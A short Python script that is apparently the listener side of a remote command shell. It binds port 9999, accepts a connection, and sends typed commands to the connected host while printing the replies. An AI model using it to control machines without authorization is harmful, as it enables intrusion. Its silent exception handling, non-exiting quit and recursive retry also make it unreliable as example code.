import socket

def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))

def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


def socket_accept():
    conn, address = s.accept()
    print("New connection has been established! from" + " IP " + address[0] + " | Port" + str(address[1]))
    sendCommands(conn)
    conn.close()

def sendCommands(conn):
    try:
        while True:
            cmd = input("$")
            if cmd == 'quit' or cmd=='exit' or cmd=='exit()':
                conn.close()
                s.close()
            if len(str.encode(cmd)) > 0:
                conn.sendall(str.encode(cmd))
                client_response = str(conn.recv(1024),"utf-8")
                print(client_response, end="")
    except Exception as e:
        pass


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
